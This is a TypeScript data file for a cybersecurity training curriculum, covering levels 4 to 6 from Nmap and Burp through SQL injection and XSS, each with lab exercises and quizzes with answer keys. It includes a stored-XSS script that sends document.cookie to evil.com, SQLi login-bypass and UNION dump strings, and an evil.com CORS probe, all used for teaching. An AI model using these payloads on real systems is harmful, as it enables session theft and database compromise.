import { MasterConcept } from './masterCurriculumGraph';

export const CONCEPTS_PART2: Record<string, MasterConcept> = {
  // LEVEL 4: TOOLS & METHODOLOGY
  'c4_security_methodology': {
    id: 'c4_security_methodology',
    level: 4,
    title: 'Structured Security Assessment Methodology',
    difficulty: 'BEGINNER',
    prerequisites: ['c3_threat_vuln_exploit'],
    nextConcepts: ['c4_nmap_scanning', 'c15_redteam_methodology'],
    relatedConcepts: ['c15_redteam_methodology'],
    definition: 'The professional testing lifecycle: Scope & RoE -> Reconnaissance -> Enumeration -> Vulnerability Analysis -> Controlled Exploitation -> Evidence Collection -> Reporting & Remediation.',
    whyItMatters: 'Unstructured testing causes unintended production outages, legal liabilities, and incomplete vulnerability coverage.',
    mentalModel: 'A surgeon preparing for an operation: Verify consent & scope -> Diagnostic scans -> Identify pathology -> Precision surgical incision -> Clean up & post-op care.',
    coreExplanation: 'Professional security assessments adhere to standard frameworks (PTES, NIST SP 800-115, OSSTMM). Testers define clear boundaries (Rules of Engagement, testing windows, out-of-scope assets), systematically enumerate attack surfaces before attempting any exploit, document proof of concept (PoC) evidence, and provide actionable remediation guidance.',
    visualExplanation: {
      type: 'flow',
      title: '7-Phase Security Assessment Pipeline',
      content: '[Scope & RoE] -> [Passive/Active Recon] -> [Port/Service Enum] -> [Vuln Analysis] -> [Controlled Exploit] -> [Post-Exploit / Evidence] -> [Remediation Report]'
    },
    example: 'Before scanning a client network, obtaining written authorization with an explicit IP whitelist and emergency contact protocol prevents unauthorized access felony charges.',
    practicalExercise: {
      task: 'Review and sign a Rules of Engagement agreement before executing a lab pentest.',
      commandOrPayload: 'echo "Authorized Target: 10.10.10.0/24 | Testing Window: 24/7 | DoS Prohibited"',
      expectedOutcome: 'Validates target scope constraints and permitted testing techniques.',
      labRoute: '/pentest-lab'
    },
    commonMistakes: [
      'Jumping straight to exploit tools (like Metasploit) without conducting thorough service enumeration.',
      'Testing targets outside the authorized written Scope of Work (RoE).'
    ],
    securityRelevance: 'Methodical assessments guarantee repeatable results and ensure executive stakeholders receive risk-ranked findings they can remediate.',
    offensivePerspective: 'Adversaries spend 80% of their operational time in reconnaissance and enumeration to find the single easiest path of entry.',
    defensivePerspective: 'Defenders utilize assessment methodology to perform self-audits and validate detection coverage against each phase of the cyber kill chain.',
    assessment: {
      question: 'Which phase of a security assessment must be completed before sending any active scan packets to a client network?',
      options: ['Controlled Exploitation', 'Rules of Engagement and Scoping Agreement', 'Privilege Escalation', 'Executive Reporting'],
      correctIndex: 1,
      explanation: 'Written Rules of Engagement and Scope definition are legally mandatory before performing any technical testing.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 1, maxAllowedHintLevel: 1, retentionIntervalDays: 30 },
    careerRelevance: ['Penetration Tester', 'Security Consultant', 'SOC Manager']
  },

  'c4_nmap_scanning': {
    id: 'c4_nmap_scanning',
    level: 4,
    title: 'Port Scanning & Service Fingerprinting with Nmap',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c2_tcp_handshake', 'c2_subnetting_cidr'],
    nextConcepts: ['c5_http_mechanics', 'c6_sqli'],
    relatedConcepts: ['c2_tcp_handshake'],
    definition: 'Using Network Mapper (Nmap) to probe network hosts, discover open TCP/UDP ports, fingerprint running service banners, and run NSE vulnerability scripts.',
    whyItMatters: 'Nmap is the definitive industry standard for active reconnaissance and network asset discovery.',
    mentalModel: 'Walking down a hotel hallway checking which room doors (ports) are unlocked and reading the name badge on the occupant (service banner).',
    coreExplanation: 'Nmap operates via specialized packet probes: `-sS` (TCP SYN half-open stealth), `-sT` (full connect), `-sU` (UDP scan), `-sV` (service version banner probing), `-sC` (default safe NSE scripts), `-O` (OS fingerprinting via TCP/IP stack quirks), `-p-` (scan all 65,535 ports).',
    visualExplanation: {
      type: 'table',
      title: 'Nmap Flag Matrix & Packet Signatures',
      content: 'Flag | Name | Mechanism | Privileges Required | Stealth Level\n-sS  | SYN Stealth | Sends SYN -> Receives SYN-ACK -> Sends RST | Root/Admin (Raw Sockets) | High (No full app log)\n-sT  | TCP Connect | Completes full 3-way handshake | Standard User | Low (Logged by server daemon)\n-sV  | Version Probe | Sends protocol probes to grab version banners | Any | Medium\n-sC  | Default Scripts | Executes Lua NSE scripts | Any | Variable\n-sU  | UDP Scan | Sends empty UDP packets, listens for ICMP Port Unreach | Root | Very Slow'
    },
    example: '`nmap -sV -sC -p 22,80,443 -oA target_recon 10.10.10.50` executes version detection and default scripts on ports 22, 80, 443 and outputs results in all 3 formats.',
    practicalExercise: {
      task: 'Execute a full service enumeration scan against the simulated lab host.',
      commandOrPayload: 'nmap -sV -sC -p 21,22,80,445 10.10.10.5',
      expectedOutcome: 'Identifies open FTP (vsftpd 2.3.4), SSH (OpenSSH 8.2), HTTP (Apache 2.4.41), and SMB (Samba 4.9).',
      labRoute: '/network-lab'
    },
    commonMistakes: [
      'Scanning only the top 1000 default ports and missing backdoors listening on high ports (e.g. 8080, 8443, 9001).',
      'Forgetting that UDP scans require `-sU` and run significantly slower due to ICMP rate limiting.'
    ],
    securityRelevance: 'Unmonitored open ports are direct vectors for exploitation. Periodic internal and external Nmap audits identify shadow IT assets.',
    offensivePerspective: 'Attackers tune scan speeds (`-T2` vs `-T4`) and randomize port sequences (`-r` vs default) to evade IDS/IPS threshold triggers.',
    defensivePerspective: 'SOC analysts configure firewalls and SIEM rules to alert on port sweeps exceeding 20 connection attempts per second from a single source IP.',
    assessment: {
      question: 'Why does an unprivileged user without root permissions default to a TCP Connect scan (-sT) instead of a SYN scan (-sS)?',
      options: [
        'Because unprivileged users cannot open raw network sockets required to craft custom SYN/RST packets',
        'Because TCP Connect scans are faster than SYN scans',
        'Because SYN scans only work on local loopback 127.0.0.1',
        'Because the operating system automatically encrypts all non-root packets'
      ],
      correctIndex: 0,
      explanation: 'Crafting raw IP packets with custom TCP flag combinations requires raw socket privileges, which standard operating systems restrict to root/Administrator.'
    },
    masteryCriteria: { minQuizScore: 85, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Penetration Tester', 'SOC Analyst', 'Network Security Engineer', 'Vulnerability Assessor']
  },

  'c4_wireshark_dissection': {
    id: 'c4_wireshark_dissection',
    level: 4,
    title: 'Packet Analysis & Protocol Dissection with Wireshark',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c2_osi_tcpip', 'c2_tcp_handshake'],
    nextConcepts: ['c9_windows_event_forensics', 'c11_soc_alert_triage'],
    relatedConcepts: ['c2_osi_tcpip'],
    definition: 'Capturing, decoding, and dissecting raw network packet streams (.pcap) to investigate protocol anomalies, cleartext credentials, and malware communications.',
    whyItMatters: 'Packet analysis provides ground truth: packets on the wire cannot lie, making Wireshark the ultimate tool for protocol forensics and troubleshooting.',
    mentalModel: 'A microscopic digital camera capturing every vehicle (packet) on a highway, opening the cargo containers, and reading the shipping manifests.',
    coreExplanation: 'Wireshark separates capture filters (libpcap syntax before capture, e.g. `host 10.0.0.1 and port 80`) from display filters (applied during analysis, e.g. `http.request.method == "POST" || tcp.analysis.flags`). Streams can be reconstructed using "Follow TCP Stream" to view bidirectional payloads.',
    visualExplanation: {
      type: 'table',
      title: 'Essential Wireshark Display Filters',
      content: 'Filter String | Investigation Objective\nhttp.request.method == "POST" | Find credential submissions, file uploads, and form posts\ndns.flags.response == 0 | View outbound domain name lookups\ntcp.flags.reset == 1 | Detect dropped or rejected connections\nip.addr == 192.168.1.50 && !ssl | Isolate unencrypted traffic to/from a specific compromised host\ntls.handshake.type == 1 | Inspect ClientHello TLS SNI (Server Name Indication) domains'
    },
    example: 'Filtering for `frame contains "password"` in a capture of legacy protocols (FTP, Telnet, HTTP) immediately reveals plaintext authentication strings.',
    practicalExercise: {
      task: 'Analyze a capture file, reconstruct an HTTP stream, and extract exfiltrated data in the Wireshark lab.',
      commandOrPayload: 'tshark -r incident.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri',
      expectedOutcome: 'Extracts web request URLs and source IPs involved in malicious file downloads.',
      labRoute: '/network-lab'
    },
    commonMistakes: [
      'Confusing capture filter syntax (`port 80`) with display filter syntax (`tcp.port == 80`).',
      'Expecting Wireshark to decrypt TLS traffic without providing the session master secrets (`SSLKEYLOGFILE`).'
    ],
    securityRelevance: 'Network forensics uncovers malware beaconing cadences, data exfiltration channels, and lateral movement SMB commands across internal networks.',
    offensivePerspective: 'Attackers capture local subnet traffic via ARP spoofing to harvest unencrypted credentials or NTLM challenge-response handshakes.',
    defensivePerspective: 'Incident responders extract malicious payload binaries directly from PCAP streams (`File -> Export Objects -> HTTP`) for sandbox detonation.',
    assessment: {
      question: 'Which display filter isolates outbound DNS query requests from clients in Wireshark?',
      options: ['dns.flags.response == 0', 'dns.query == true', 'port.dns == 53', 'http.dns.request'],
      correctIndex: 0,
      explanation: 'In the DNS protocol header, `dns.flags.response == 0` specifies a query, while `1` indicates a server response.'
    },
    masteryCriteria: { minQuizScore: 85, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['SOC Analyst', 'DFIR Analyst', 'Threat Hunter', 'Network Engineer']
  },

  'c4_burp_proxy': {
    id: 'c4_burp_proxy',
    level: 4,
    title: 'Web Interception Proxies with Burp Suite',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c0_client_server', 'c2_tcp_handshake'],
    nextConcepts: ['c5_http_mechanics', 'c6_sqli', 'c6_xss', 'c6_idor'],
    relatedConcepts: ['c5_http_mechanics'],
    definition: 'An HTTP/HTTPS interception proxy sitting between the browser and web server, allowing security professionals to inspect, tamper with, and replay web requests.',
    whyItMatters: 'Burp Suite is the primary workhorse tool used by professional web penetration testers, application security engineers, and bug bounty hunters.',
    mentalModel: 'A border checkpoint customs officer who halts incoming and outgoing delivery trucks, inspects cargo contents, edits invoices on the fly, and lets them continue.',
    coreExplanation: 'Burp Suite acts as a Man-in-the-Middle proxy on `127.0.0.1:8080`. Core modules include: Proxy (intercept & modify on the fly), Repeater (craft and reissue individual requests), Intruder (automated customized payload fuzzing), and Decoder (Base64/URL/Hex transformations).',
    visualExplanation: {
      type: 'flow',
      title: 'Burp Suite Interception Flow',
      content: '[Browser / Client] ---> [Burp Proxy :8080 (Inspect / Edit Request)] ---> [Web Application Server]\n[Browser / Client] <--- [Burp Proxy :8080 (Inspect / Edit Response)] <--- [Web Application Server]'
    },
    example: 'In Burp Repeater, changing a parameter from `user_id=105` to `user_id=1` tests if the server enforces authorization checks (IDOR flaw).',
    practicalExercise: {
      task: 'Intercept a login request in the Web Security Lab, send it to Repeater, and test parameter tampering.',
      commandOrPayload: 'curl -x http://127.0.0.1:8080 -k http://vulnerable-app.lab/api/user/1',
      expectedOutcome: 'Burp Proxy intercepts the HTTP request for manual inspection and modification.',
      labRoute: '/web-security-lab'
    },
    commonMistakes: [
      'Forgetting to install the PortSwigger CA certificate in the browser, causing SSL/TLS untrusted certificate errors.',
      'Relying purely on client-side browser forms without inspecting raw HTTP parameters in the proxy.'
    ],
    securityRelevance: 'Client-side validations (HTML5 required attributes, JavaScript regex checks) provide zero security because attackers tamper with requests directly in Burp.',
    offensivePerspective: 'Pentesters use Repeater to iteratively test edge-case injection payloads, fuzz headers, and analyze subtle server response differences.',
    defensivePerspective: 'AppSec engineers use Burp DAST scanning to identify unvalidated redirects, missing security headers (CSP, HSTS), and vulnerable third-party components.',
    assessment: {
      question: 'Why are client-side JavaScript input validations ineffective against an attacker using Burp Suite?',
      options: [
        'Because Burp Suite runs inside the Linux kernel',
        'Because Burp Suite intercepts and modifies raw HTTP requests after client-side scripts execute and before reaching the server',
        'Because JavaScript is automatically converted into Python on the server',
        'Because browsers disable JavaScript when communicating with proxies'
      ],
      correctIndex: 1,
      explanation: 'Interception proxies modify HTTP payloads directly on the network wire after the browser has already finished executing client-side validation logic.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Application Security Engineer', 'Penetration Tester', 'Bug Bounty Hunter']
  },

  // LEVEL 5: WEB ARCHITECTURE & FUNDAMENTALS
  'c5_http_mechanics': {
    id: 'c5_http_mechanics',
    level: 5,
    title: 'HTTP Mechanics: Methods, Headers & Status Codes',
    difficulty: 'BEGINNER',
    prerequisites: ['c0_client_server'],
    nextConcepts: ['c5_cookies_sessions', 'c6_sqli'],
    relatedConcepts: ['c0_client_server', 'c5_cookies_sessions'],
    definition: 'Hypertext Transfer Protocol (HTTP) request-response structure: Verbs (GET, POST, PUT, DELETE), Request/Response Headers, Status Codes (2xx, 3xx, 4xx, 5xx), and Body payloads.',
    whyItMatters: 'Web applications dominate modern software; understanding HTTP is prerequisite to exploiting or defending web APIs, cloud interfaces, and browsers.',
    mentalModel: 'An official postal letter: The envelope header (To, From, Content-Type) instructs the courier; the letter body contains the actual message content.',
    coreExplanation: 'An HTTP request starts with the Request Line (`METHOD /path HTTP/1.1`), followed by Headers (`Host:`, `User-Agent:`, `Authorization:`), an empty CRLF line (`\\r\\n`), and optional Body. Responses return a Status Line (`HTTP/1.1 200 OK`), Response Headers (`Content-Type:`, `Set-Cookie:`), and Body.',
    visualExplanation: {
      type: 'code',
      title: 'Raw HTTP/1.1 Request Structure',
      content: 'POST /api/login HTTP/1.1\\r\\n\nHost: target.com\\r\\n\nContent-Type: application/json\\r\\n\nContent-Length: 38\\r\\n\n\\r\\n\n{"username":"admin","password":"secret"}'
    },
    example: 'A status code of 403 Forbidden indicates the server understood the request but refuses authorization; 404 indicates the resource path does not exist; 500 indicates unhandled server exception.',
    practicalExercise: {
      task: 'Issue raw HTTP requests using curl and inspect full header verbose streams.',
      commandOrPayload: 'curl -ivs -X GET http://example.com',
      expectedOutcome: 'Prints TCP connection status, outgoing request headers, incoming response headers (Date, ETag), and HTML body.',
      labRoute: '/web-security-lab'
    },
    commonMistakes: [
      'Assuming GET requests cannot contain parameters (parameters are appended in query strings: `?id=1`).',
      'Confusing 401 Unauthorized (unauthenticated, missing login) with 403 Forbidden (authenticated, but lacking permissions).'
    ],
    securityRelevance: 'Header injection (e.g. Host Header injection, CRLF injection) and HTTP request smuggling exploit parser discrepancies between front-end and back-end web servers.',
    offensivePerspective: 'Attackers manipulate custom headers (e.g. `X-Forwarded-For: 127.0.0.1`) to bypass IP-restricted admin panels.',
    defensivePerspective: 'Defenders configure security headers: `Strict-Transport-Security` (HSTS), `Content-Security-Policy` (CSP), `X-Content-Type-Options: nosniff`, and `X-Frame-Options: DENY`.',
    assessment: {
      question: 'Which HTTP response status code indicates that the client has not provided valid authentication credentials?',
      options: ['200 OK', '302 Found', '401 Unauthorized', '502 Bad Gateway'],
      correctIndex: 2,
      explanation: '401 Unauthorized indicates the request requires user authentication credentials.'
    },
    masteryCriteria: { minQuizScore: 85, requiredPracticalRuns: 1, maxAllowedHintLevel: 1, retentionIntervalDays: 14 },
    careerRelevance: ['Application Security Engineer', 'Web Developer', 'Penetration Tester']
  },

  'c5_cookies_sessions': {
    id: 'c5_cookies_sessions',
    level: 5,
    title: 'Stateless HTTP, Cookies, Sessions & JWT Tokens',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c5_http_mechanics'],
    nextConcepts: ['c6_idor', 'c6_xss'],
    relatedConcepts: ['c5_http_mechanics'],
    definition: 'State management mechanisms over stateless HTTP: Session IDs stored in server memory/cache, browser cookies, and cryptographically signed JSON Web Tokens (JWT).',
    whyItMatters: 'Authentication and session flaws allow adversaries to hijack user accounts, impersonate administrators, and achieve full system takeover.',
    mentalModel: 'A coat check ticket: You check your coat (authenticate), get a paper ticket (session ID / cookie), and show the ticket on future visits to claim your coat.',
    coreExplanation: 'HTTP is stateless. Servers set cookies via `Set-Cookie: session_id=XYZ; Secure; HttpOnly; SameSite=Strict`. JWTs contain three Base64URL parts: Header.Payload.Signature (`alg=HS256`). If the secret key is weak or signature verification is disabled (`alg=none`), attackers forge administrative tokens.',
    visualExplanation: {
      type: 'diagram',
      title: 'Session Cookie vs JWT Token Architecture',
      content: 'Session Cookie: [Client (Cookie: session_id=123)] -> [Server looks up session_id in Redis DB]\nJWT Token:      [Client (Bearer Header.Payload.Signature)] -> [Server validates cryptographic signature locally without DB lookup]'
    },
    example: 'A cookie marked `HttpOnly` cannot be read by JavaScript `document.cookie`, preventing cookie theft via Cross-Site Scripting (XSS).',
    practicalExercise: {
      task: 'Inspect and decode JWT structure in the Web Security Lab.',
      commandOrPayload: 'echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.signature" | cut -d. -f2 | base64 -d 2>/dev/null',
      expectedOutcome: 'Decodes JSON payload showing claims: `{"user":"admin","role":"admin"}`.',
      labRoute: '/web-security-lab'
    },
    commonMistakes: [
      'Storing sensitive secrets (passwords, private keys) inside JWT payloads (JWT payloads are Base64 encoded and visible to anyone).',
      'Failing to set `Secure` (HTTPS only) and `HttpOnly` flags on session cookies.'
    ],
    securityRelevance: 'Session fixation, weak session entropy, and predictable JWT signing secrets allow unauthenticated attackers to forge arbitrary user identities.',
    offensivePerspective: 'Pentesters test JWT signature bypasses (`none` algorithm, HMAC with public RSA key) to elevate privileges to administrator.',
    defensivePerspective: 'Developers use asymmetric JWT signing (RS256) with strict algorithm whitelisting, short expiration times (exp), and refresh token rotation.',
    assessment: {
      question: 'Which cookie security attribute prevents client-side JavaScript from accessing the cookie value, mitigating XSS session theft?',
      options: ['Secure', 'HttpOnly', 'SameSite=Lax', 'Domain'],
      correctIndex: 1,
      explanation: 'The `HttpOnly` flag instructs the browser that the cookie should not be accessible via client-side scripts like `document.cookie`.'
    },
    masteryCriteria: { minQuizScore: 85, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Application Security Engineer', 'Penetration Tester', 'Full Stack Developer']
  },

  'c5_rest_apis_json': {
    id: 'c5_rest_apis_json',
    level: 5,
    title: 'REST APIs, JSON Payloads & GraphQL Fundamentals',
    difficulty: 'BEGINNER',
    prerequisites: ['c5_http_mechanics'],
    nextConcepts: ['c6_idor', 'c6_ssrf'],
    relatedConcepts: ['c5_http_mechanics'],
    definition: 'Representational State Transfer (REST) endpoints communicating via JSON payloads over HTTP verbs, alongside GraphQL single-endpoint query architectures.',
    whyItMatters: 'Modern mobile and single-page applications run almost entirely on backend APIs, which currently represent the largest web attack surface.',
    mentalModel: 'A drive-thru intercom: You speak formatted orders (JSON), the kitchen processes them, and hands you structured boxes through the service window.',
    coreExplanation: 'REST uses resource URIs with HTTP methods: `GET /api/v1/users` (list), `POST /api/v1/users` (create), `PUT /api/v1/users/4` (replace), `PATCH /api/v1/users/4` (partial update), `DELETE /api/v1/users/4` (remove). GraphQL uses a single `POST /graphql` endpoint with custom nested query schemas.',
    visualExplanation: {
      type: 'table',
      title: 'REST API Verbs & Resource Endpoints',
      content: 'Verb | URI Path | Action | Idempotent?\nGET | /api/accounts/12 | Retrieve account 12 details | Yes\nPOST | /api/accounts | Create new account | No\nPUT | /api/accounts/12 | Replace full account 12 record | Yes\nDELETE | /api/accounts/12 | Delete account 12 | Yes'
    },
    example: 'Sending `curl -X POST -H "Content-Type: application/json" -d \'{"email":"test@lab.local"}\' http://api.lab/register` creates a user record.',
    practicalExercise: {
      task: 'Fuzz and enumerate hidden API endpoints using ffuf or curl.',
      commandOrPayload: 'curl -s http://api.lab.local/api/v1/docs | grep -i "endpoint"',
      expectedOutcome: 'Extracts Swagger/OpenAPI documentation schema revealing unauthenticated administrative endpoints.',
      labRoute: '/web-security-lab'
    },
    commonMistakes: [
      'Assuming APIs are secure because there is no visible HTML web UI (attackers discover endpoints via mobile APK decompilation or JS source maps).',
      'Exposing sensitive stack traces and internal database schemas inside JSON error responses.'
    ],
    securityRelevance: 'OWASP API Security Top 10 highlights Broken Object Level Authorization (BOLA/IDOR) and Broken Authentication as the most rampant API vulnerabilities.',
    offensivePerspective: 'Attackers inspect JavaScript source maps (`.map` files) to extract hidden internal API endpoints and API keys.',
    defensivePerspective: 'Security teams enforce API gateways with strict rate limiting, schema validation, and centralized OAuth2 token authorization checks on every route.',
    assessment: {
      question: 'Which HTTP method is specifically designed for creating a new resource record in a standard RESTful API?',
      options: ['GET', 'POST', 'DELETE', 'OPTIONS'],
      correctIndex: 1,
      explanation: 'POST is used in REST architectures to submit data to specify the creation of a new subordinate resource.'
    },
    masteryCriteria: { minQuizScore: 80, requiredPracticalRuns: 1, maxAllowedHintLevel: 1, retentionIntervalDays: 14 },
    careerRelevance: ['Application Security Engineer', 'Penetration Tester', 'Backend Engineer']
  },

  'c5_browser_same_origin': {
    id: 'c5_browser_same_origin',
    level: 5,
    title: 'Browser Security Model: SOP, CORS & CSP',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c5_http_mechanics'],
    nextConcepts: ['c6_xss'],
    relatedConcepts: ['c6_xss'],
    definition: 'The Same-Origin Policy (SOP - restricting cross-origin resource reads based on Protocol, Host, and Port), Cross-Origin Resource Sharing (CORS), and Content Security Policy (CSP).',
    whyItMatters: 'Without SOP, any malicious website you visit could silently make requests to your bank and read your personal account data.',
    mentalModel: 'Apartment building rules: Residents in Building A (Origin A) cannot walk into Building B (Origin B) and open drawers unless Building B gives explicit written permission (CORS header).',
    coreExplanation: 'Origin is defined as `Protocol + Domain + Port` (e.g. `https://bank.com:443`). SOP prevents `evil.com` from reading responses from `bank.com`. CORS allows servers to relax this via `Access-Control-Allow-Origin: https://app.com`. Misconfigured CORS with `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` leaks private user data.',
    visualExplanation: {
      type: 'table',
      title: 'Same-Origin Policy Comparison Matrix (Target: http://example.com:80/app)',
      content: 'Queried URL | Same Origin? | Reason\nhttp://example.com/other | YES | Same protocol (http), host (example.com), port (80)\nhttps://example.com/app | NO | Different protocol (https vs http)\nhttp://sub.example.com/app | NO | Different host (subdomain)\nhttp://example.com:8080/app | NO | Different port (8080 vs 80)'
    },
    example: 'If `api.bank.com` responds with `Access-Control-Allow-Origin: null` and `Access-Control-Allow-Credentials: true`, an attacker hosting an iframe on `evil.com` can steal victim bank statements.',
    practicalExercise: {
      task: 'Inspect CORS headers on API endpoints to identify wildcards or origin reflection.',
      commandOrPayload: 'curl -i -H "Origin: https://evil.com" http://api.lab.local/user/profile',
      expectedOutcome: 'Checks if the server insecurely reflects the untrusted `evil.com` origin in its `Access-Control-Allow-Origin` header.',
      labRoute: '/web-security-lab'
    },
    commonMistakes: [
      'Believing CORS is a security control that protects the client (CORS is a relaxation mechanism that allows servers to share resources with trusted third parties).',
      'Dynamically echoing back any `Origin` header sent by the client without validation.'
    ],
    securityRelevance: 'CORS misconfigurations allow cross-site data theft, while robust Content Security Policy (CSP) headers mitigate Cross-Site Scripting (XSS) exploitation.',
    offensivePerspective: 'Pentesters send crafted `Origin` headers to identify origin reflection vulnerabilities and extract sensitive user profile JSON across origins.',
    defensivePerspective: 'AppSec teams implement strict whitelist-based CORS configurations and deploy strict CSP directives (`default-src \'self\'; script-src \'nonce-...\'`).',
    assessment: {
      question: 'Which of the following URLs is considered the SAME origin as http://store.com:80/catalog/index.html?',
      options: [
        'https://store.com:80/catalog/index.html',
        'http://store.com:8080/catalog/index.html',
        'http://store.com:80/api/cart',
        'http://api.store.com:80/catalog/index.html'
      ],
      correctIndex: 2,
      explanation: '`http://store.com:80/api/cart` shares the exact same protocol (http), domain (store.com), and port (80).'
    },
    masteryCriteria: { minQuizScore: 85, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Application Security Engineer', 'Frontend Security Architect', 'Penetration Tester']
  },

  // LEVEL 6: WEB SECURITY & OWASP
  'c6_sqli': {
    id: 'c6_sqli',
    level: 6,
    title: 'SQL Injection (SQLi) from Query Logic to Extraction',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c5_http_mechanics', 'c4_burp_proxy'],
    nextConcepts: ['c6_idor', 'c6_xss'],
    relatedConcepts: ['c6_idor'],
    definition: 'A web security vulnerability allowing attackers to interfere with queries made by an application to its database by injecting malicious SQL control characters.',
    whyItMatters: 'SQLi allows attackers to bypass authentication, dump entire database tables (passwords, credit cards), and in some configurations achieve Remote Code Execution (RCE).',
    mentalModel: 'A fill-in-the-blank form: "Please enter name: [John]". But the user writes "[John\'; DROP TABLE Users; --]". The system mistakenly executes the user\'s name as an instruction.',
    coreExplanation: 'SQLi occurs when untrusted input is concatenated directly into a dynamic SQL string without parametrization. Types: In-band (UNION-based, Error-based), Inferential/Blind (Boolean-based, Time-based `pg_sleep()`), and Out-of-band (OOB). Remediation: ALWAYS use Prepared Statements (Parameterized Queries).',
    visualExplanation: {
      type: 'code',
      title: 'Vulnerable Concatenation vs Secure Prepared Statement',
      content: '// VULNERABLE (Concatenation):\nquery = "SELECT * FROM users WHERE user = \'" + userInput + "\' AND pass = \'" + passInput + "\'";\n// Payload: userInput = admin\' --\n// Executed SQL: SELECT * FROM users WHERE user = \'admin\' --\' AND pass = \'...\'\n\n// SECURE (Parameterized Query):\nstmt = db.prepare("SELECT * FROM users WHERE user = ? AND pass = ?");\nstmt.execute([userInput, passInput]); // Inputs treated strictly as data literals'
    },
    example: 'In a search bar query `SELECT * FROM items WHERE name LIKE \'%SEARCH%\'`, injecting `\' UNION SELECT username, password FROM users --` dumps user credentials.',
    practicalExercise: {
      task: 'Bypass authentication on the vulnerable login portal using SQL injection in the Web Security Lab.',
      commandOrPayload: 'admin\' OR 1=1 --',
      expectedOutcome: 'Bypasses password verification and logs in as the administrator user.',
      labRoute: '/web-security-lab'
    },
    commonMistakes: [
      'Relying on blacklist filtering (stripping `\'` or `OR`) instead of parameterized queries (attackers bypass blacklists using encoding or alternative SQL syntax).',
      'Believing ORMs automatically prevent SQLi (raw SQL queries inside ORM methods like `sequelize.literal()` are still vulnerable).'
    ],
    securityRelevance: 'SQLi has caused massive historical corporate data breaches (e.g. Equifax, Heartland Payment Systems).',
    offensivePerspective: 'Pentesters use automated tools (sqlmap) or manual UNION payloads to map database schemas (`information_schema.tables`) and extract sensitive records.',
    defensivePerspective: 'Defenders enforce parameterized queries, apply least-privilege database user permissions (no `GRANT ALL`), and deploy WAF rules to detect common SQL keywords.',
    assessment: {
      question: 'What is the absolute gold-standard architectural defense that completely neutralizes SQL Injection vulnerabilities?',
      options: [
        'Client-side JavaScript character length limits',
        'Parameterized Queries (Prepared Statements) where input is treated strictly as data',
        'Filtering out the word "SELECT" using a regex blacklist',
        'Running the database on a non-standard network port'
      ],
      correctIndex: 1,
      explanation: 'Prepared Statements pre-compile the SQL query structure, ensuring user inputs are treated exclusively as literal data parameters, never executable SQL commands.'
    },
    masteryCriteria: { minQuizScore: 90, requiredPracticalRuns: 2, maxAllowedHintLevel: 1, retentionIntervalDays: 21 },
    careerRelevance: ['Application Security Engineer', 'Penetration Tester', 'Database Administrator', 'Software Engineer']
  },

  'c6_xss': {
    id: 'c6_xss',
    level: 6,
    title: 'Cross-Site Scripting (XSS): Stored, Reflected & DOM',
    difficulty: 'INTERMEDIATE',
    prerequisites: ['c5_browser_same_origin', 'c4_burp_proxy'],
    nextConcepts: ['c6_ssrf', 'c6_idor'],
    relatedConcepts: ['c5_browser_same_origin'],
    definition: 'A code injection vulnerability where malicious JavaScript is injected into trusted web applications and executed inside the victim\'s browser session.',
    whyItMatters: 'XSS allows attackers to steal session cookies, capture keystrokes (keylogger), perform actions on behalf of the user, and deliver drive-by browser malware.',
    mentalModel: 'A vandal writing an official-looking sign on a hotel notice board: "Please hand your room keys to the man in the lobby". Guests obey because the notice board itself is trusted.',
    coreExplanation: 'Types: 1) Reflected XSS (payload in URL parameters reflected immediately in response), 2) Stored XSS (payload stored permanently in database comments/profiles and executed whenever any user views the page), 3) DOM-based XSS (flaw in client-side JS handling untrusted sinks like `innerHTML` or `document.write`). Remediation: Context-aware output encoding, Content Security Policy (CSP), and `HttpOnly` cookie flags.',
    visualExplanation: {
      type: 'flow',
      title: 'Stored XSS Attack Lifecycle',
      content: '[Attacker] -> (Submits comment: <script>fetch("http://evil.com/steal?c="+document.cookie)</script>) -> [Server Database]\n[Victim User] -> (Views comment page) -> [Server sends HTML with script] -> [Victim Browser executes script & sends cookies to Attacker]'
    },
    example: 'Entering `<img src=x onerror=alert(document.domain)>` in an unescaped username profile field triggers when other users view the profile.',
    practicalExercise: {
      task: 'Identify and exploit a reflected XSS vulnerability in the search input field.',
      commandOrPayload: '<script>alert("XSS_LAB_VERIFIED")</script>',
      expectedOutcome: 'Executes injected JavaScript in the browser context, proving script execution capability.',
      labRoute: '/web-security-lab'
    },
    commonMistakes: [
      'Using HTML entity encoding inside JavaScript contexts (HTML encoding does not prevent XSS inside `<script>` blocks; JS context encoding is required).',
      'Assuming modern frameworks like React eliminate 100% of XSS (using `dangerouslySetInnerHTML` or `javascript:` href links still introduces XSS).'
    ],
    securityRelevance: 'Stored XSS in administrative panels allows attackers to gain full control of all enterprise users and internal administrative actions.',
    offensivePerspective: 'Pentesters craft multi-stage XSS payloads to weaponize CSRF attacks, force administrative user creation, and exfiltrate confidential DOM elements.',
    defensivePerspective: 'AppSec teams enforce strict context-aware output encoding (DOMPurify), ban dangerous sink APIs, and enforce strict Content Security Policy headers.',
    assessment: {
      question: 'Which type of XSS vulnerability occurs when the malicious payload is permanently saved in the application database and rendered to other users?',
      options: ['Reflected XSS', 'Stored XSS', 'DOM-based XSS', 'Self XSS'],
      correctIndex: 1,
      explanation: 'Stored (Persistent) XSS stores the malicious payload in persistent storage (e.g. database, forum post, comment) so it executes whenever victims view the stored record.'
    },
